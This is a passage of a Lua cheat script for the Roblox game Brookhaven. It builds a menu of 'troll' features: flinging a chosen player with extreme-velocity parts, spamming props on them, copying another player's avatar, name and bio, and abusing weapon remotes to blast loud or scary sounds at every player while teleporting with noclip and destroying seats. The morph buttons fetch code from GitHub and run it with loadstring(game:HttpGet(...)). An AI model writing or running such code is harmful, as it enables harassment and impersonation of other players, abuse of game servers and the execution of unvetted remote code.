                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "FLING BOAT",
        Default = false,
        Callback = function(state)
            ClearConnection("FLING BOAT")
            ClearConnection("FLING BOAT_CONN")

            if state then
                activeConnections["FLING BOAT"] = task.spawn(function()
                    local boat = SpawnAndSitBoat()
                    local angleOrbit = 0
                    local rotX, rotY, rotZ = 0, 0, 0

                    local conn
                    conn = RunService.Heartbeat:Connect(function()
                        local target = FindTarget(selectedPlayerName)
                        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                        local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                        local lhum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
                        local thrp = target.Character.HumanoidRootPart

                        if not hrp or not lhum then return end

                        if not lhum.Sit then
                            ClearConnection("FLING BOAT")
                            ClearConnection("FLING BOAT_CONN")
                            return
                        end

                        angleOrbit = angleOrbit + 0.35
                        rotX = rotX + 40
                        rotY = rotY + 55
                        rotZ = rotZ + 25

                        local offsetX = math.cos(angleOrbit) * 30
                        local offsetZ = math.sin(angleOrbit) * 30
                        local targetPos = thrp.Position + Vector3.new(offsetX, 15, offsetZ)

                        local targetPart = (boat and (boat.PrimaryPart or boat:FindFirstChild("Body") or boat:FindFirstChildOfClass("BasePart"))) or hrp

                        targetPart.AssemblyLinearVelocity = Vector3.new(50000, 50000, 50000)
                        targetPart.AssemblyAngularVelocity = Vector3.new(50000, 50000, 50000)
                        targetPart.CFrame = CFrame.new(targetPos) 
                            * CFrame.Angles(math.rad(rotX), math.rad(rotY), math.rad(rotZ))
                    end)

                    activeConnections["FLING BOAT_CONN"] = conn
                end)
            else
                if LP.Character then
                    local lhum = LP.Character:FindFirstChildOfClass("Humanoid")
                    local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
                    if lhum then lhum.Sit = false end
                    if hrp then
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                    end
                end
            end
        end
    })

    TabTroll:AddToggle({
        Name = "PROP SPAM",
        Default = false,
        Callback = function(state)
            ClearConnection("PROP SPAM")
            if state then
                activeConnections["PROP SPAM"] = task.spawn(function()
                    while true do
                        local target = FindTarget(selectedPlayerName)
                        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                            local currentTarget = FindTarget(selectedPlayerName)
                            if currentTarget and currentTarget.Character and currentTarget.Character:FindFirstChild("HumanoidRootPart") then
                                local playerPos = currentTarget.Character.HumanoidRootPart.Position
                                
                                local char = LP.Character
                                if char and char:FindFirstChild("PropMaker") and char.PropMaker:FindFirstChild("Tool_PropMake") then
                                    local argsProp = {
                                        [1] = workspace.Model.Wedge,
                                        [2] = playerPos
                                    }
                                    char.PropMaker.Tool_PropMake:FireServer(unpack(argsProp))
                                end
                            end
                        end
                        task.wait(0.8)
                    end
                end)
            end
        end
    })
end

-- ==========================================
-- TAB AVATAR
-- ==========================================
local TabAvatar = Window:MakeTab({"AVATAR", "shirt"})

-- ================= SERVICES =================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes")

local TargetName = nil

-- ================= TEXTBOX =================
TabAvatar:AddTextBox({
    Name = "TARGET NAME",
    Description = "Enter target player name",
    PlaceholderText = "Username or Display...",
    Callback = function(Value)
        TargetName = Value
    end
})

-- ================= FUNÇÃO PARA ACHAR PLAYER =================
local function FindTarget(name)
    name = name:lower()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower():find(name) or plr.DisplayName:lower():find(name) then
            return plr
        end
    end
    return nil
end

-- ================= COPY AVATAR =================
TabAvatar:AddButton({"COPY AVATAR", function()
    if not TargetName then return end

    local TPlayer = FindTarget(TargetName)
    if not TPlayer or not TPlayer.Character then return end

    local LP = Players.LocalPlayer
    local LChar = LP.Character
    if not LChar then return end

    local LHumanoid = LChar:FindFirstChildOfClass("Humanoid")
    local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")
    if not (LHumanoid and THumanoid) then return end

    -- RESET LOCAL
    local LDesc = LHumanoid:GetAppliedDescription()
    for _, acc in ipairs(LDesc:GetAccessories(true)) do
        if tonumber(acc.AssetId) then
            Remotes.Wear:InvokeServer(acc.AssetId)
            task.wait(0.2)
        end
    end
    for _, id in ipairs({LDesc.Shirt, LDesc.Pants, LDesc.Face}) do
        if tonumber(id) then
            Remotes.Wear:InvokeServer(id)
            task.wait(0.2)
        end
    end

    -- COPY TARGET
    local PDesc = THumanoid:GetAppliedDescription()
    Remotes.ChangeCharacterBody:InvokeServer({
        PDesc.Torso,
        PDesc.RightArm,
        PDesc.LeftArm,
        PDesc.RightLeg,
        PDesc.LeftLeg,
        PDesc.Head
    })

    task.wait(0.5)

    for _, id in ipairs({PDesc.Shirt, PDesc.Pants, PDesc.Face}) do
        if tonumber(id) then
            Remotes.Wear:InvokeServer(id)
            task.wait(0.3)
        end
    end

    for _, acc in ipairs(PDesc:GetAccessories(true)) do
        if tonumber(acc.AssetId) then
            Remotes.Wear:InvokeServer(acc.AssetId)
            task.wait(0.3)
        end
    end

    local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
    if SkinColor then
        Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
    end

    if tonumber(PDesc.IdleAnimation) then
        Remotes.Wear:InvokeServer(PDesc.IdleAnimation)
    end

    -- BIO / CORES
    local Bag = TPlayer:FindFirstChild("PlayersBag")
    if Bag then
        if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
            Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
        end
        if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
            Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
        end
        if Bag:FindFirstChild("RPNameColor") then
            Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
        end
        if Bag:FindFirstChild("RPBioColor") then
            Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
        end
    end
end})

-- ================= HSV RGB COMPLETO =================

local RBW_Name = false
local RBW_Bio = false
local RBW_Body = false
local RBW_Speed = 1

TabAvatar:AddSection({"HSV RGB"})

TabAvatar:AddToggle({
	Name = "NAME RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Name = v
	end
})

TabAvatar:AddToggle({
	Name = "BIO RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Bio = v
	end
})

TabAvatar:AddToggle({
	Name = "BODY RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Body = v
	end
})

TabAvatar:AddTextBox({
	Name = "RGB SPEED",
	Description = "Adjust rainbow cycle speed",
	PlaceholderText = "1",
	Callback = function(v)
		local n = tonumber(v)
		if n and n > 0 then
			RBW_Speed = n
		end
	end
})

task.spawn(function()
	local hue = 0

	while true do
		task.wait(0.05)

		if RBW_Body or RBW_Name or RBW_Bio then
			hue = (hue + 0.01 * RBW_Speed) % 1

			local color = Color3.fromHSV(hue, 1, 1)
			local brick = BrickColor.new(color)

			if RBW_Body then
				Remotes.ChangeBodyColor:FireServer(brick.Name)
			end

			if RBW_Name then
				game:GetService("ReplicatedStorage")
					.RE["1RPNam1eColo1r"]
					:FireServer("PickingRPNameColor", color)
			end

			if RBW_Bio then
				game:GetService("ReplicatedStorage")
					.RE["1RPNam1eColo1r"]
					:FireServer("PickingRPBioColor", color)
			end
		end
	end
end)

-- =========================================================
-- RED BLACK WHITE RGB
-- =========================================================
local RBW_Colors = {
	Color3.fromRGB(255, 0, 0),
	Color3.fromRGB(0, 0, 0),
	Color3.fromRGB(255, 255, 255)
}

local RBW_Name = false
local RBW_Bio = false
local RBW_Body = false
local RBW_Speed = 0.7

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local ColorRemote = RE:WaitForChild("1RPNam1eColo1r")

TabAvatar:AddSection({"RED BLACK RGB"})

TabAvatar:AddToggle({
	Name = "NAME RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Name = v end
})

TabAvatar:AddToggle({
	Name = "BIO RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Bio = v end
})

TabAvatar:AddToggle({
	Name = "BODY RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Body = v end
})

TabAvatar:AddTextBox({
	Name = "RGB SPEED (RBW)",
	Description = "Set the color shifting delay interval",
	PlaceholderText = tostring(RBW_Speed),
	Callback = function(v)
		local n = tonumber(v)
		if n and n > 0.05 then
			RBW_Speed = n
		end
	end
})

task.spawn(function()
	local i = 1
	while true do
		task.wait(RBW_Speed)
		
		if RBW_Name or RBW_Bio or RBW_Body then
			i = i % #RBW_Colors + 1
			local currentColor = RBW_Colors[i]
			
			-- Altera a cor do Nome no RP do Brookhaven
			if RBW_Name then
				pcall(function()
					ColorRemote:FireServer("PickingRPNameColor", currentColor)
				end)
			end
			
			-- Altera a cor da Bio no RP do Brookhaven
			if RBW_Bio then
				pcall(function()
					ColorRemote:FireServer("PickingRPBioColor", currentColor)
				end)
			end
			
			-- Altera a cor da skin do personagem
			if RBW_Body then
				pcall(function()
					local brick = BrickColor.new(currentColor)
					Remotes.ChangeBodyColor:FireServer(brick.Name)
				end)
			end
		end
	end
end)

-- ================= RP NAMES =================
local RoleplayNames = {
	{"ANONYMOUS"," ANONYMOUS "},
	{"PRO PLAYER"," PRO PLAYER "},
	{"ERROR 666"," ERROR 666 "},
	{"GHOST"," GHOST "},
	{"JOKER"," JOKER "},
	{"ADMIN"," ADMIN "},
	{"TUBERS 93"," TUBERS 93 "},
	{"RED BLACK MEMBER"," RED BLACK MEMBER "},
	{"RED BLACK COMMUNITY"," RED BLACK COMMUNITY "},
	{"ADMIN RED BLACK"," ADMIN RED BLACK "}
}

local selectedRP = nil

TabAvatar:AddSection({"RP Names"})

TabAvatar:AddDropdown({
	Name = "SELECT RP NAME",
	Description = "Choose an identity",
	Options = (function()
		local list = {}
		for _, v in ipairs(RoleplayNames) do
			table.insert(list, v[1])
		end
		return list
	end)(),
	Default = RoleplayNames[1][1],
	Callback = function(value)
		for _, v in ipairs(RoleplayNames) do
			if v[1] == value then
				selectedRP = v[2]
			end
		end
	end
})

TabAvatar:AddButton({"APPLY RP NAME", function()
	if not selectedRP then return end
	game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayName", selectedRP)
end})

-- ================= CLOTHES =================
TabAvatar:AddSection({"Clothes"})

TabAvatar:AddButton({"RED BLACK COMMUNITY SHIRT", function()
	Remotes.WearShirt:InvokeServer(101480394255855)
end})

TabAvatar:AddButton({"RED BLACK COMMUNITY PANTS", function()
	Remotes.WearPants:InvokeServer(124684324540170)
end})

-- ================= ITENS =================
TabAvatar:AddSection({"Itens"})

TabAvatar:AddButton({"SCARY HEAD", function()
	Remotes.Wear:InvokeServer(14994946752)
end})

TabAvatar:AddButton({"SCARY BRO 1", function()
	Remotes.Wear:InvokeServer(98235263954323)
end})

TabAvatar:AddButton({"SCARY BRO 2", function()
	Remotes.Wear:InvokeServer(87859729921468)
end})

TabAvatar:AddSection({"Morphs"})

local SELECTED_MORPH = nil

TabAvatar:AddDropdown({
    Name = "SELECT MORPH",
    Description = "Choose a morph to transform into",
    Options = {
        "SCP 096",
        "SCP 173",
        "SID",
        "WORM BRO",
        "TUNG TUNG TUNG SAHUR",
        "BIG GUY",
        "DOJE",
        "DUCK",
        "SQUIRREL",
        "BROWN CHICKEN",
        "GIGA CHAD",
        "KAWASAKI",
        "MIKE WAZOWSKI",
        "MONKEY",
        "PIGEON"
    },
    Default = "",
    Callback = function(Value)
        SELECTED_MORPH = Value
    end
})

TabAvatar:AddButton({"EQUIP", function()
    if not SELECTED_MORPH then return end

    if SELECTED_MORPH == "SCP 096" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/SCP%20096"))()

    elseif SELECTED_MORPH == "SCP 173" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/SCP%20173"))()

    elseif SELECTED_MORPH == "SID" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/SID"))()

    elseif SELECTED_MORPH == "WORM BRO" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/WORM%20BRO"))()

    elseif SELECTED_MORPH == "TUNG TUNG TUNG SAHUR" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/TUNG%20TUNG%20TUNG%20SAHUR"))()

    elseif SELECTED_MORPH == "BIG GUY" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/BIG%20GUY"))()

    elseif SELECTED_MORPH == "DOJE" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/DOJE"))()

    elseif SELECTED_MORPH == "DUCK" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/DUCK"))()

    elseif SELECTED_MORPH == "SQUIRREL" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/ESQUILO"))()

    elseif SELECTED_MORPH == "BROWN CHICKEN" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/GALINHA"))()

    elseif SELECTED_MORPH == "GIGA CHAD" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/GIGA%20CHAD"))()

    elseif SELECTED_MORPH == "KAWASAKI" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/KAVAZAKI"))()

    elseif SELECTED_MORPH == "MIKE WAZOWSKI" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/MAIKI"))()

    elseif SELECTED_MORPH == "MONKEY" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/MONKEY"))()

    elseif SELECTED_MORPH == "PIGEON" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/PINGEON"))()
    end
end})

-- ================= SPECIAL ITEMS =================
do
	local SectionSpecial = TabAvatar:AddSection({"Legs & Heads"})

	local function EquipItemDirect(ids)
		if not LP or not LP.Character or not Remotes then return end
		pcall(function()
			for _, id in ipairs(ids) do
				Remotes.Wear:InvokeServer(id)
				task.wait(0.15)
			end
		end)
	end

	-- ICE LEG
	TabAvatar:AddButton({"ICE LEG", function()
		EquipItemDirect({139572789})
	end})

	-- HEADLESS
	TabAvatar:AddButton({"HEADLESS", function()
		local headlessId = 15093053680
		if headlessId ~= 0 then
			EquipItemDirect({headlessId})
		end
	end})

	-- ZOMBIE LEG
	TabAvatar:AddButton({"ZOMBIE LEG", function()
		EquipItemDirect({86681341524412})
	end})
end

-- ================= ACCESSORIES =================
do
	local SectionAccessories = TabAvatar:AddSection({"ACCESSORIES"})

	local function EquipAccessory(ids)
		if not LP or not LP.Character or not Remotes then return end
		pcall(function()
			for _, id in ipairs(ids) do
				Remotes.Wear:InvokeServer(id)
				task.wait(0.15)
			end
		end)
	end

	-- DOMINUS FRIGIDUS
	TabAvatar:AddButton({"DOMINUS FRIGIDUS", function()
		EquipAccessory({48545806})
	end})

	-- DOMINUS FORMIDULOSUS
	TabAvatar:AddButton({"DOMINUS FORMIDULOSUS", function()
		EquipAccessory({4255053867})
	end})

	-- DOMINUS PRAEFECTUS
	TabAvatar:AddButton({"DOMINUS PRAEFECTUS", function()
		EquipAccessory({527365852})
	end})

	-- DOMINUS MESSOR
	TabAvatar:AddButton({"DOMINUS MESSOR", function()
		EquipAccessory({64444871})
	end})

	-- DOMINUS VESPERTILIO
	TabAvatar:AddButton({"DOMINUS VESPERTILIO", function()
		EquipAccessory({96103379})
	end})

	-- DOMINUS REX
	TabAvatar:AddButton({"DOMINUS REX", function()
		EquipAccessory({250395631})
	end})

	-- DOMINUS EMPYREUS FVM
	TabAvatar:AddButton({"DOMINUS EMPYREUS FVM", function()
		EquipAccessory({151789690})
	end})

	-- DOMINUS AUREUS
	TabAvatar:AddButton({"DOMINUS AUREUS", function()
		EquipAccessory({138932314})
	end})

	-- DOMINUS PITTACIUM
	TabAvatar:AddButton({"DOMINUS PITTACIUM", function()
		EquipAccessory({335080779})
	end})

	-- DOMINUS INFERNUS
	TabAvatar:AddButton({"DOMINUS INFERNUS", function()
		EquipAccessory({31101391})
	end})

	-- DOMINUS EMPYREUS
	TabAvatar:AddButton({"DOMINUS EMPYREUS", function()
		EquipAccessory({21070012})
	end})

	-- PIRATE CAPTAIN HAT
	TabAvatar:AddButton({"PIRATE CAPTAIN HAT", function()
		EquipAccessory({1028859})
	end})

	-- P SINISTER
	TabAvatar:AddButton({"P SINISTER", function()
		EquipAccessory({17450053})
	end})

	-- RIDDLE SKULL
	TabAvatar:AddButton({"RIDDLE SKULL", function()
		EquipAccessory({4765718})
	end})

	-- MAD COW
	TabAvatar:AddButton({"MAD COW", function()
		EquipAccessory({14673292})
	end})

	-- CLOCKWORK FVM
	TabAvatar:AddButton({"CLOCKWORK FVM", function()
		EquipAccessory({232492903})
	end})

	-- S SINISTER
	TabAvatar:AddButton({"S SINISTER", function()
		EquipAccessory({37819478})
	end})

	-- THE EARTH
	TabAvatar:AddButton({"THE EARTH", function()
		EquipAccessory({10072631})
	end})
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
local RE = ReplicatedStorage:WaitForChild("RE")

local SoundIdValue = ""
local SelectedDropdownAudio = ""

local LoopTextboxEnabled = false
local LoopDropdownEnabled = false
local AudioAllActive = false

local BoomboxRGBEnabled = false
local BoomboxRGBSpeed = 0.5

local PresetAudios = {
    ["GET OUT"] = "17580996350",
    ["WINDOWS NOTIF"] = "2389339814",
    ["LOUD"] = "108451658708095",
    ["DIE FORTNITE"] = "72536455880966",
    ["REAL LOUD"] = "131682359704129",
    ["LIE DETECTOR"] = "117916446144888",
    ["NUKE ALARM"] = "433848566",
    ["LOOP BEEP SOUND"] = "6486261822",
    ["SCARY SOUND"] = "6516011433",
    ["SCARY SREAM"] = "111272255398192",
    ["SUS SCREAM"] = "76571808089308",
    ["NECK HURTS"] = "90409807315293",
    ["CHIKEN SCREAM"] = "81891427788694",
    ["VDSMA CARLINHOS"] = "135212564271817"
}

local DropdownOptions = {
    "GET OUT",
    "WINDOWS NOTIF",
    "LOUD",
    "DIE FORTNITE",
    "REAL LOUD",
    "LIE DETECTOR",
    "NUKE ALARM",
    "LOOP BEEP SOUND",
    "SCARY SOUND",
    "SCARY SREAM",
    "SUS SCREAM",
    "NECK HURTS",
    "CHIKEN SCREAM",
    "VDSMA CARLINHOS"
}

local function playLocalClientSound(audioId)
    task.spawn(function()
        local character = LP.Character
        if not character then return end
        local head = character:FindFirstChild("Head")
        if not head then return end
        
        local cleanID = tostring(audioId):gsub("%D", "")
        
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://" .. cleanID
        sound.Volume = 2
        sound.Parent = head
        sound:Play()
        
        sound.Ended:Connect(function()
            sound:Destroy()
        end)
        
        task.wait(10)
        if sound and sound.Parent then sound:Destroy() end
    end)
end

local function fireShotgunRemote(audioId)
    local character = LP.Character
    if not character then return end
    
    local shotgun = character:FindFirstChild("Shotgun") or LP.Backpack:FindFirstChild("Shotgun")
    if not shotgun then return end
    
    local handle = shotgun:FindFirstChild("Handle")
    local gunScript = shotgun:FindFirstChild("GunScript_Local")
    if not handle or not gunScript then return end
    
    local muzzle = gunScript:FindFirstChild("MuzzleEffect")
    local hitEffect = gunScript:FindFirstChild("HitEffect")
    if not muzzle or not hitEffect then return end

    local cleanID = tostring(audioId):gsub("%D", "")
    local targetAudioID = tonumber(cleanID)
    if not targetAudioID then return end

    local args = {
        workspace:WaitForChild("Model"):WaitForChild("MeshPart"),
        handle,
        vector.create(-2.700000047683716, 0.125, 0),
        vector.create(332.68603515625, 31, 400.6531982421875),
        muzzle,
        hitEffect,
        targetAudioID,
        140181997495870,
        { false },
        {
            25,
            vector.create(0.25, 0.25, 100),
            BrickColor.new(24),
            0.25,
            Enum.Material.SmoothPlastic,
            0.25
        },
        true,
        false
    }

    playLocalClientSound(targetAudioID)

    pcall(function()
        RE:WaitForChild("1Gu1n"):FireServer(unpack(args))
    end)
end

local function runAudioAllSystem(audioIdToPlay)
    if AudioAllActive then return end
    local character = LP.Character
    if not character then return end
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end

    AudioAllActive = true
    local originalCFrame = rootPart.CFrame

    local disabledSeats = {}
    for _, seat in ipairs(workspace:GetDescendants()) do
        if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
            if seat.Disabled == false then
                seat.Disabled = true
                table.insert(disabledSeats, seat)
            end
        end
    end

    local noclipConnection
    noclipConnection = RunService.Stepped:Connect(function()
        if LP.Character then
            for _, part in ipairs(LP.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)

    local targets = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            table.insert(targets, p)
        end
    end

    for _, target in ipairs(targets) do
        local targetChar = target.Character
        local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
        
        if targetRoot then
            fireShotgunRemote(audioIdToPlay)

            local startTime = os.clock()
            while os.clock() - startTime < 1 do
                if targetRoot and rootPart and LP.Character then
                    rootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 2)
                end
                RunService.Heartbeat:Wait()
            end
        end
    end

    if noclipConnection then noclipConnection:Disconnect() end
    
    for _, seat in ipairs(disabledSeats) do
        if seat and seat.Parent then
            seat.Disabled = false
        end
    end

    if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
        LP.Character.HumanoidRootPart.CFrame = originalCFrame
    end
    
    AudioAllActive = false
end

task.spawn(function()
    while true do
        task.wait(0.1)
        if LoopTextboxEnabled and SoundIdValue ~= "" then
            fireShotgunRemote(SoundIdValue)
            task.wait(0.4)
        end
        if LoopDropdownEnabled and SelectedDropdownAudio ~= "" then
            local id = PresetAudios[SelectedDropdownAudio]
            if id then
                fireShotgunRemote(id)
                task.wait(0.4)
            end
        end
    end
end)

local BoomboxColors = {
    Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255),
    Color3.fromRGB(255, 165, 0), Color3.fromRGB(128, 0, 128), Color3.fromRGB(255, 20, 147),
    Color3.fromRGB(139, 69, 19), Color3.fromRGB(75, 0, 130), Color3.fromRGB(0, 128, 128),
    Color3.fromRGB(192, 192, 192), Color3.fromRGB(255, 255, 255)
}

task.spawn(function()
    while true do
        task.wait(BoomboxRGBSpeed)
        if BoomboxRGBEnabled then
            local color = BoomboxColors[math.random(#BoomboxColors)]
            pcall(function()
                LP:WaitForChild("PlayerGui")
                    :WaitForChild("ToolGui")
                    :WaitForChild("ToolSettings")
                    :WaitForChild("Settings")
                    :WaitForChild("PropsColor")
                    :WaitForChild("SetColor")
                    :FireServer(color)
            end)
        end
    end
end)

local TabSound = Window:MakeTab({"SOUND FE", "volume-2"})

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local SoundIdValue = ""
local SelectedDropdownAudio = "GET OUT"

local LoopTextboxEnabled = false
local LoopDropdownEnabled = false

local TextboxCooldownValue = 0.2
local DropdownCooldownValue = 0.2

local function fireSniperRemote(audioId)
    local character = LocalPlayer.Character
    if not character then return end
    
    local sniper = character:FindFirstChild("Sniper")
    if not sniper then return end

    local handle = sniper:FindFirstChild("Handle")
    local gunScript = sniper:FindFirstChild("GunScript_Local")
    
    if handle and gunScript then
        local muzzleEffect = gunScript:FindFirstChild("MuzzleEffect")
        local hitEffect = gunScript:FindFirstChild("HitEffect")
        
        local cleanAudioId = tonumber(audioId) or audioId
        
        local args = {
            workspace:WaitForChild("Model"):WaitForChild("001_SpawnColor"):WaitForChild("Color2"),
            handle,
            Vector3.new(0, 0.42500001192092896, -3.299999952316284),
            Vector3.new(-3.630251884460449, 0.40000152587890625, -10.42583179473877),
            muzzleEffect,
            hitEffect,
            cleanAudioId,
            140181997495870,
            { false },
            {
                25,
                Vector3.new(0.25, 0.25, 100),
                BrickColor.new(24),
                0.25,
                Enum.Material.SmoothPlastic,
                0.25
            },
            true,
            false
        }
        
        pcall(function()
            RE:WaitForChild("1Gu1n"):FireServer(unpack(args))
        end)
        
        task.spawn(function()
            pcall(function()
                local localSound = Instance.new("Sound")
                localSound.SoundId = "rbxassetid://" .. tostring(audioId)
                localSound.Volume = 5
                localSound.Parent = handle
                localSound:Play()
                task.wait(2)
                localSound:Destroy()
            end)
        end)
    end
end

local function runAudioAllSystem(audioId)
    if not audioId or audioId == "" then return end
    
    local character = LocalPlayer.Character
    if not character then return end
    
    local originalCFrame = character:GetPivot()
    
    pcall(function()
        for _, desc in ipairs(workspace:GetDescendants()) do
            if desc:IsA("Seat") or desc:IsA("VehicleSeat") then
                desc:Destroy()
            end
        end
    end)
    
    local noclipConnection
    noclipConnection = RunService.Stepped:Connect(function()
        if character then
            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)
    
    task.spawn(function()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local targetRoot = player.Character.HumanoidRootPart
                local startTime = os.clock()
                
                fireSniperRemote(audioId)
                
                while os.clock() - startTime < 1.5 and targetRoot and targetRoot.Parent and character and character.Parent do
                    pcall(function()
                        character:PivotTo(targetRoot.CFrame)
                    end)
                    RunService.Heartbeat:Wait()
                end
            end
        end
        
        if noclipConnection then noclipConnection:Disconnect() end
        if character then
            character:PivotTo(originalCFrame)
        end
    end)
end

TabSound:AddSection({"Required Tools"})

TabSound:AddButton({"GET SNIPER", function()
    task.spawn(function()
        pcall(function()
            RE:WaitForChild("1Too1l"):InvokeServer("PickingTools", "Sniper")
        end)
    end)
end})

TabSound:AddButton({"GET BOOMBOX", function()
    task.spawn(function()
        pcall(function()
            RE:WaitForChild("1Too1l"):InvokeServer("PickingTools", "Boombox")
        end)
    end)
end})

TabSound:AddSection({"Boombox / FE Sound"})

TabSound:AddTextBox({
    Name = "SOUND ID",
    Description = "Enter audio asset ID",
    PlaceholderText = "Audio ID...",
    Callback = function(value)
        SoundIdValue = tostring(value)
    end
})

TabSound:AddButton({"PLAY SOUND", function()
    if SoundIdValue == "" then return end

    task.spawn(function()
        pcall(function()
            RE:WaitForChild("PlayerToolEvent"):FireServer(
                "ToolMusicText",
                SoundIdValue,
                nil,
                true
            )
        end)
    end)
end})

TabSound:AddToggle({
    Name = "RGB BOOMBOX",
    Default = false,
    Callback = function(state)
        BoomboxRGBEnabled = state
    end
})

TabSound:AddTextBox({
    Name = "RGB SPEED (SECONDS)",
    Description = "Adjust color changing interval",
    PlaceholderText = "0.5",
    Callback = function(value)
        local v = tonumber(value)
        if v and v > 0.05 then
            BoomboxRGBSpeed = v
        end
    end
})

TabSound:AddParagraph({"WARNING", "To play sounds using the Boombox, you must own the Sound Game Pass. You can also temporarily access it by watching an advertisement, which grants the Sound Game Pass for 10 minutes."})

TabSound:AddSection({"Custom FE Sound"})

TabSound:AddParagraph({"SNIPER REQUIREMENT WARNING", "You must have the Sniper equipped in your hand for the sounds to work. If it stays in your backpack, nothing will happen."})

TabSound:AddTextBox({
    Name = "SOUND ID",
    Description = "Enter custom audio asset ID",
    PlaceholderText = "Audio ID...",
    Callback = function(value)
        SoundIdValue = tostring(value)
    end
})

TabSound:AddButton({"PLAY SOUND", function()
    if SoundIdValue ~= "" then
        fireSniperRemote(SoundIdValue)
    end
end})

TabSound:AddTextBox({
    Name = "LOOP COOLDOWN",
    Description = "Set cooldown interval in seconds",
    PlaceholderText = "0.2",
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 0 then
            textboxCooldownValue = num 
        end
    end
})

TabSound:AddToggle({
    Name = "LOOP SOUND",
    Default = false,
    Callback = function(state)
        LoopTextboxEnabled = state
